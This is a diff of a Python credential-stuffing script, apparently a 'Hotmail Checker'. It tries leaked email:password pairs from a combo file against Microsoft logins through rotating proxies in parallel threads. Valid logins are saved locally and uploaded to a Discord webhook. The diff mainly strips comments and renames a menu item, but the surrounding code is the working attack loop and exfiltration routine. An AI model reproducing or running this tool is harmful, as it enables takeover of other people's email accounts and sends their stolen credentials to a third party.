@@ -7,16 +7,13 @@ from concurrent.futures import ThreadPoolExecutor
 from tempfile import NamedTemporaryFile
 import os
 
-# Initialize Colorama for cross-platform compatibility
 init(autoreset=True)
 
 mail = MailHub()
 
-# Lock to ensure only one thread writes to the file at a time
 write_lock = threading.Lock()
 
 def validate_line(line):
-    """Validate the line format to prevent IndexError."""
     parts = line.strip().split(":")
     if len(parts) == 2:
         return parts[0], parts[1]
@@ -24,7 +21,6 @@ def validate_line(line):
         return None, None
 
 def attempt_login(email, password, proxy, hits_file, local_hits_file):
-    """Attempt login with a given email, password, and proxy."""
     res = mail.loginMICROSOFT(email, password, proxy)[0]
 
     if res == "ok":
@@ -38,7 +34,6 @@ def attempt_login(email, password, proxy, hits_file, local_hits_file):
         print(Fore.RED + f"Invalid | {email}:{password}")
 
 def process_combo_file(hits_file, local_hits_file, proxies):
-    """Process the combo file and attempt logins in parallel."""
     with open("combo.txt", "r") as file:
         with ThreadPoolExecutor(max_workers=10) as executor:
             futures = []
@@ -56,7 +51,6 @@ def process_combo_file(hits_file, local_hits_file, proxies):
                 future.result()
 
 def send_to_discord(file_path, webhook_url):
-    """Send the file to a Discord webhook as an attachment."""
     if os.stat(file_path).st_size == 0:
         print(Fore.RED + "The file is empty. No valid hits found.")
         return
@@ -82,7 +76,7 @@ def send_to_discord(file_path, webhook_url):
 def main():
     while True:
         print(Fore.CYAN + "Menu:")
-        print("1. Start login attempts")
+        print("1. Start Hotmail Checker")
         print("2. Exit")
         choice = input(Fore.CYAN + "Enter your choice: ").strip()
 
@@ -92,7 +86,6 @@ def main():
             with open("proxy.txt", "r") as proxy_file:
                 proxies = proxy_file.readlines()
 
-            # Open the local file to save valid hits permanently
             with open("valid_hits.txt", "a", encoding="utf-8") as local_hits_file:
                 with NamedTemporaryFile(delete=False, mode='w', newline='', encoding='utf-8') as temp_file:
                     print(Fore.CYAN + "Starting login attempts...")
@@ -110,10 +103,10 @@ def main():
             print(Fore.RED + "Invalid choice. Please try again.")
             continue
         
-        os.remove(temp_file.name)  # Delete the temporary file after processing
+        os.remove(temp_file.name)
         input(Fore.CYAN + "Press any key to continue...")
-        print(Fore.RESET)  # Reset the colorama terminal colors for the next iteration
-        os.system('cls' if os.name == 'nt' else 'clear')  # Clear the terminal screen for the next iteration
+        print(Fore.RESET)
+        os.system('cls' if os.name == 'nt' else 'clear')
         print()
 
 if __name__ == "__main__":
